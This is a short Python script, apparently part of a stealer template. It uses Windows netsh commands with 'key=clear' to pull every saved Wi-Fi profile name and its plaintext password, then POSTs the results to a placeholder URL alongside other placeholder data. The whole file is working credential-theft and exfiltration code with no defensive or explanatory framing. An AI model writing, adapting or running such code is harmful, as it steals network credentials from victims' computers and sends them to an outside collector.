import requests
import platform,os,subprocess,json


def getwifi():
    meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    data = meta_data.decode('utf-8', errors ="backslashreplace")
    data = data.split('\n')
    wifi = []
    for i in data:
        if "All User Profile" in i :
            i = i.split(":")
            i = i[1]
            i = i[1:-1]
            try:
                results = subprocess.check_output(f'netsh wlan show profile "{i}" key=clear',stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                print(e.output.decode())
                exit()
            results = results.decode('utf-8', errors ="backslashreplace")
            results = results.split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            wifi.append([i,results[0]])
    return wifi

def sendrequest(url,data):
    r = requests.post(url,data)
data = DATA
data['wifi'] = getwifi()
print("sending wifi")
sendrequest(URL,data)
